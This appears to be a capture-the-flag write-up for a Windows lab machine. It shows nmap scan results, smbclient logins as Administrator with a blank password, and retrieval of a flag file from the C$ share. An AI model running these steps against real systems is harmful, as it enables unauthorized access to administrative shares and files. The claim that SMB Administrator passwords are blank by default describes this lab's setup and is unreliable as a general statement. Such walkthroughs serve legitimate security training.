Step 1 
  Run nmap on the machine based on the questions they probably want us to run a no ping scan so lets see what happens. 
  nmap -Pn <target_IP>
  Scan Results:
    PORT    STATE SERVICE
    135/tcp open  msrpc
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
  
 Step 2: 
  So we have identified there is an open service on port 445 which we know is used for SMB so we will try to use default credentials to see the shares
  smbclient -L <target_IP> -U Administrator
  Just press enter to input a blank password when prompted. By default smb Administrator password is blank.
  Results:
    Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        
  Step 3:
    The C share is the windows C drive and it has administrator authorization so we should be able to use smbclient to navigate over to it and retrieve files from it
    smbclient \\\\<target_IP>\\C$ -U Administrator
    
    From here you should be able to use basic command line arguments to navigate around the file system and look for the flag. For me the find command wouldn't work 
    so I had to look manually it was ultimately found in the \Users\Administrator\Desktop directory
    We can use the get command with smbclient to retrieve the flag
    from the administrator/Desktop directory enter
    get flag.txt
    Press Ctrl+c to exit the smb client and the flag.txt file should be in the directory you were working from
